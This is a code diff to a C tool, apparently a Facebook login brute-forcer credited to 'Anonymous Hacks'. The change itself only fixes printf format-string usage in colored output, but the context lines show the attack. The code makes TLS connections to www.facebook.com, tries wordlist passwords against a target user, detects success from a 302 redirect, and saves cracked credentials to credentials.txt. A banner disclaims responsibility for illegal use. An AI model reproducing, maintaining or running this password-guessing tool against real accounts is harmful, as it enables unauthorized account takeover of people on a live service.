@@ -36,9 +36,9 @@ void menu() {
     printf("\t     \n");
     printf("\t[ + ]   Coded by: Anonymous Hacks                     [ + ]  \n");
     printf("\t[ + ]   GitHub: https://www.github.com/4anonz         [ + ]v1\n");
-    printf(blue);
+    printf("%s", blue);
     printf("\t[ + ]Note!: We won't accept any responsibility for any illegal use[ + ]\n\n");
-    printf(reset);
+    printf("%s", reset);
 
 }
 
@@ -67,7 +67,7 @@ SSL *connect_server() {
     SSL_CTX *context = SSL_CTX_new(TLS_client_method());
 
     if(!context) {
-        printf(red); printf("[Error]:"); printf(reset);
+        printf("%s", red); printf("[Error]:"); printf("%s", reset);
         printf("SSL_CTX_new() failed");
         exit(1);
     }
@@ -79,7 +79,7 @@ SSL *connect_server() {
     struct addrinfo *server_addr;
     if(getaddrinfo("www.facebook.com", "443", &hints, &server_addr)) {
 
-        printf(red); printf("[Error]:"); printf(reset);
+        printf("%s", red); printf("[Error]:"); printf("%s", reset);
         printf(" getaddrinfo code:%d : (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
         ErrorExit();
     }
@@ -89,14 +89,14 @@ SSL *connect_server() {
                                                     server_addr->ai_protocol);
     if(!IsValidSocket(connect_socket)) {
 
-        printf(red);printf("[Error]:");printf(reset);
+        printf("%s", red);printf("[Error]:");printf("%s", reset);
         printf(" socket code:%d: (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
         ErrorExit();
     }
     //Connect the prevois created socket to the server
     if(connect(connect_socket, server_addr->ai_addr, server_addr->ai_addrlen)) {
 
-        printf(red); printf("[Error]:");printf(reset);
+        printf("%s", red); printf("[Error]:");printf("%s", reset);
         printf("connect code:%d: (%s)\n", GetErrorNo(), strerror(GetErrorNo()));
         CloseSocket(connect_socket);
         ErrorExit();
@@ -106,14 +106,14 @@ SSL *connect_server() {
     
     SSL *ssl = SSL_new(context);
     if(!ssl) {
-        printf(red); printf("[Error]:");printf(reset);
+        printf("%s", red); printf("[Error]:");printf("%s", reset);
         printf("SSL_new() failed\n");
         ErrorExit();
     }
     /*Allow OpneSSL to use SNI */
     if(!SSL_set_tlsext_host_name(ssl, "www.facebook.com")) {
 
-        printf(red); printf("[Error]:");printf(reset);
+        printf("%s", red); printf("[Error]:");printf("%s", reset);
         printf("SSL_set_tlsext_host_name() failed");
         ERR_print_errors_fp(stdout);
         ErrorExit();
@@ -122,7 +122,7 @@ SSL *connect_server() {
     SSL_set_fd(ssl, connect_socket);
     if(SSL_connect(ssl) == -1) {
 
-        printf(red); printf("[Error]:");printf(reset);
+        printf("%s", red); printf("[Error]:");printf("%s", reset);
         printf("SSL_connect() failed");
         ERR_print_errors_fp(stdout);
         printf("\n");
@@ -234,7 +234,7 @@ void login(char *wlist, char *user) {
 
         // Establish a SSL/TLS connection to facebook server
         SSL *ssl = connect_server();
-        printf(cyan); printf("[Info]: "); printf(reset);
+        printf("%s", cyan); printf("[Info]: "); printf("%s", reset);
         printf("Tying login =====> %s", password);
 
         //Send the HTTP request headers
@@ -265,19 +265,19 @@ void login(char *wlist, char *user) {
 
         if(strstr(read, "302") || strstr(read, "Location: ")) success = 1;
         if(success) {
-            printf(yellow);
+            printf("%s", yellow);
             printf("\n");
             printf("\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
             printf("                                                    \n");
             printf("\t     Password Found[!] ==> %s ^.^                 \n", password);
             printf("                                                    \n");
             printf("\t$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n");
-            printf(reset);
+            printf("%s", reset);
             break;
         } else {
-            printf(red);
+            printf("%s", red);
             printf("\t\t[failed]\n");
-            printf(reset);
+            printf("%s", reset);
         }
     }
 
@@ -291,10 +291,10 @@ void login(char *wlist, char *user) {
         fprintf(cred, "|--Password   : %s\n", password);
         fclose(cred);
     }
-    printf(cyan);
-    printf("\n[Info]:"); printf(reset);
-    printf(" Brute-Force Complete!"); printf(blue);
-    printf("[ ✔ ]\n"); printf(reset);
+    printf("%s", cyan);
+    printf("\n[Info]:"); printf("%s", reset);
+    printf(" Brute-Force Complete!"); printf("%s", blue);
+    printf("[ ✔ ]\n"); printf("%s", reset);
     fclose(wordlist);
     if(success) printf("Login Credentials save to 'credentials.txt'\n\n");
 }
